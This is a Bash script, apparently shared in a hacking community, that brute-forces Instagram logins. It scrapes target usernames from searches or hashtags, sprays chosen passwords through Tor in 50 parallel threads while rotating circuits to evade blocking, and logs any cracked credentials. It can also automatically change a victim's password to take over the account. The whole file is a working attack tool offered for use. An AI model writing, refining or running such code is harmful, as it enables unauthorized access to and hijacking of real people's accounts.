# !/bin/bash
# Author 		: ./Lolz
# Thanks to 		: JavaGhost - Bashid.org
# Recode tinggal recode aja okeh, tapi cantumin source lah tolol
# Yamaap kalau scriptnya acak"an:(

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# start
# trap
trap ctrl_c INT

# If user click ctrl + c = program stopped and remove all tmp file in dir multiBF_ig
function ctrl_c(){
	if [[ ! -e *.tmp* ]]; then
		echo -e "${white}"
	else
		echo -e "${white}"
		rm *.tmp*
	fi
}

# dependencies
dependencies=( "jq" "curl" "tor" )
for depen in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo -e >&2 "${white}[ ${red}STOPPED${white} ] ${red}-${white} package ${green}${depen}${white} not installed! ${red}-${white} install by typing the command ${red}:${white} apt install $i -y"
        exit
    }
done

# checking run tor
check_tor=$(curl --socks5-hostname localhost:9050 -s "https://www.google.com" > /dev/null; echo $?)
if [[ $check_tor -gt 0 ]]; then
	echo -e "${white}[ ${red}ERROR${white} ] TOR not runing! ${red}-${white} run with type ${red}'${green}tor${red}'${white} in your terminal"
	exit
fi

# create file
touch target.tmp user.tmp unknown.tmp

# banner + menu
echo -e '''
      \e[1;37m                _  __       _ 
      \e[1;37m__     | _|_ o |_)|_     o (_|
      \e[1;37m||||_| |  |_ | |_)|  ___ | __|
   \e[1;37m[\e[1;31m Contact \e[1;31m:\e[1;34m https://fb.me/n00b.me\e[1;37m ]

1\e[1;31m. \e[1;37mGet \e[1;31m+ \e[1;37mcrack target from spesific \e[1;32m@username\e[1;37m
2\e[1;31m. \e[1;37mGet \e[1;31m+ \e[1;37mcrack target from spesific \e[1;32m@hashtag\e[1;37m
3\e[1;31m. \e[1;37mCrack target from target list\e[1;37m
'''

# asking
echo -ne "${white}[ ${red}?${white} ] Choose what you want boy ${red}:${green} " ; read ask_menu

# select menu
case $ask_menu in
	1 ) # menu 1
		echo -e "\n${white}[ ${red}NOTE${white} ] ${red}:${white} Give space to search for more than 1 user ${red}[${white} example ${red}:${white} user1 user2 ${red}]${white}"
		echo -ne "${white}[ ${red}?${white} ] Input spesific username ${red}:${green} " ; read ask_user && echo $ask_user | tr " " "\n" > username.tmp
		for get_user in $(cat username.tmp); do
			get_list_user=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${get_user}" | jq -r '.users[].user.username' >> target.tmp)
		done
		echo -e "${white}[ ${red}+${white} ] Found             ${red}:${green} $(< target.tmp wc -l) user ${white}with user ${red}:${green} ${ask_user}${white}"
		echo -ne "${white}[ ${red}?${white} ] Password to use 	${red}:${green} " ; read ask_pass && echo $ask_pass | tr " " "\n" >> wordlist.tmp
		echo -e "${white}[ ${green}INFO${white} ] - Start cracking \e[4m${green}$(< target.tmp wc -l)${white}\e[0m user using pass ${red}:${green} \e[4m${ask_pass}${white}\e[0m\n"
		;;
	2 ) # menu 2
		echo -ne "\n${white}[ ${red}?${white} ] Input spesific hashtag ${red}:${green} " ; read ask_tag
		get_list_user=$(curl -sXGET "https://www.instagram.com/explore/tags/${ask_tag}/?__a=1")
		if [[ $get_list_user =~ "Page Not Found" ]]; then
			echo -e "${white}[ ${red}-${white} ] Hashtag ${red}:${green} ${ask_tag} ${red}-${white} Not found"
			exit
		else
			echo $get_list_user | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > user.tmp
			for tag_user in $(cat user.tmp); do
                echo $tag_user | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target.tmp &
            done
            wait
            echo -e "${white}[ ${red}!${white} ] Please wait..."
			echo -e "${white}[ ${red}!${white} ] Removing duplicate user $(sort -u user.tmp -o user.tmp)"
			echo -e "${white}[ ${red}+${white} ] Found             ${red}:${green} $(< target.tmp wc -l) user in hashtag ${red}:${green} ${ask_tag}${white}"
			echo -ne "${white}[ ${red}?${white} ] Password to use 	${red}:${green} " ; read ask_pass && echo $ask_pass | tr " " "\n" >> wordlist.tmp
			echo -e "${white}[ ${green}INFO${white} ] ${red}-${white} Start cracking \e[4m${green}$(< target.tmp wc -l)${white}\e[0m user using pass ${red}:${green} \e[4m${ask_pass}${white}\e[0m\n"
		fi
		;;
	3 ) # menu 3
		echo -ne "${white}[ ${red}?${white} ] Input list target username ${red}:${green} " ; read ask_list
		if [[ ! -e $ask_list ]]; then
			echo -e "${white}[ ${red}!${white} ] ${red}List not found in your directory${white}"
		else
			cat $ask_list > target.tmp
			echo -ne "${white}[ ${red}?${white} ] Password to use 	         ${red}:${green} " ; read ask_pass && echo $ask_pass | tr " " "\n" >> wordlist.tmp
			echo -e "${white}[ ${green}INFO${white} ] ${red}-${white} Start cracking \e[4m${green}$(< target.tmp wc -l)${white}\e[0m user using pass ${red}:${green} \e[4m${ask_pass}${white}\e[0m\n"
		fi
		;;
	* ) # wrong menu
		echo -e "${white}[ ${red}ERROR${white} ] ${red}:${white} Option not on menu boy..."
		sleep 2
		clear
		bash brute.sh
		;;
esac

# change password after brute force [ if success ]
function change_password(){
	csrftoken=$(curl -sL -sXGET -b Cookies_${user}.tmp --url "https://www.instagram.com" -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" | grep -o "csrf_token.*" | cut -d '"' -f3)
	change=$(curl -sL -sXPOST -b Cookies_${user}.tmp --url "https://www.instagram.com/accounts/password/change/" \
					-H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
					-H "x-csrftoken: ${csrftoken}" \
					-d "old_password=${pass}&new_password1=${ask_new_pass}&new_password2=${ask_new_pass}" | jq -r '.status')
					if [[ $change == "ok" ]]; then
						echo -e "${white} [ ${red}+${white} ] User ${red}:${green} @${user} ${red}-${white} Success change pass to ${red}:${green} ${ask_new_pass}${white}"
					else
						echo -e " ${white} [ ${red}FAILED CHANGE PASS${white} ] ${red}-${white} @${user}${red}:${white}${ask_new_pass} ${red}-${white} Contact ${red}:${blue} https://fb.me/n00b.me${white}"
					fi
}

# asking change pass
echo -ne "${white}[ ${red}?${white} ] Do you want auto change pass after get some account ${red}( ${white}y/n ${red})${white} ${red}:${green} " ; read ask_change_pass
if [[ $ask_change_pass == "Y" || $ask_change_pass == "y" ]]; then
	echo -ne "${white}[ ${red}?${white} ] Input new pass ${red}:${green} " ; read ask_new_pass
	echo ""
elif [[ $ask_change_pass == "N" || $ask_change_pass == "n" ]]; then
	echo ""
fi

# login
function brute_force(){
	# Start brute force
	token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
	login=$(curl -sc Cookies_${user}.tmp -XPOST "https://www.instagram.com/accounts/login/ajax/" \
					-H "cookie: csrftoken=${token}" \
					-H "origin: https://www.instagram.com" \
					-H "referer: https://www.instagram.com/accounts/login/" \
					-H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
					-H "x-csrftoken: ${token}" \
					-H "x-requested-with: XMLHttpRequest" \
					-d "username=${user}&password=${pass}") ; true_login=$(echo $login | jq -r '.authenticated')
  					if [[ $true_login =~ "true" ]]; then
  						local followers=$(curl -sXGET "https://instagram.com/${user}/" -L | grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
  						echo -e " ${white}[ ${green}GOT ACCOUNT${white} ] ${red}-${white} @${user}${red}:${white}${pass} ${red}:${green} ${followers} ${white}Followers"
  						echo "${user}:${pass}" >> account_success_crack.txt
						if [[ $ask_change_pass == "Y" || $ask_change_pass == "y" ]]; then
							change_password
	  						echo "${user}:${pass}" >> account_success_crack.txt
						fi
						killall -HUP tor
  					elif [[ $login =~ "checkpoint_required" ]]; then
  						echo -e " ${white}[ ${cyan}CHECKPOINT${white} ] ${red}-${white} @${user}${red}:${white}${pass}"
						killall -HUP tor
  					elif [[ $login =~ "false" ]]; then
  						echo -e " ${white}[ ${red}FAILED TO CRACK${white} ] ${red}-${white} @${user}${red}:${white}${pass}"
  						killall -HUP tor
  					else
  						echo -e " ${white}[ ${yellow}UNKNOWN ERROR${white} ]${red} ${white}- @${user}${red}:${white}${pass}"
  						killall -HUP tor
  					fi
}

# multithread
(
	LIMIT="50" # thread
	for user in $(cat target.tmp); do
		for pass in $(cat wordlist.tmp); do
			((thread=thread%LIMIT)); ((thread++==0)) && wait
			brute_force "$user" &
		done
	done
	wait
)

# check got account or not
if [[ ! -e account_success_crack.txt ]]; then
	echo -e "${white}\n[ ${red}!${white} ] Ups you don't get any account boy :("
else
	echo -e "${white}[ ${red}+${white} ] You got ${red}:${green} $(< account_success_crack.txt wc -l) accounts instagram${white}"
fi

# asking for run again ot not
echo -ne "${white}[ ${red}?${white} ] Wanna play with me again boy ${red}(${white} y/n${red} ) :${green} " ; read ask_again
if [[ $ask_again == "Y" || $ask_again == "y" ]]; then
	echo -e "${white}[ ${red}+${white} ] Okay good! lets try again boy XD"
	bash brute.sh
elif [[ $ask_again == "N" || $ask_again == "n" ]]; then
	echo -e "${white}[ ${red}+${white} ] See u boy:*"
	rm *.tmp*
else
	rm *.tmp*
fi
# end
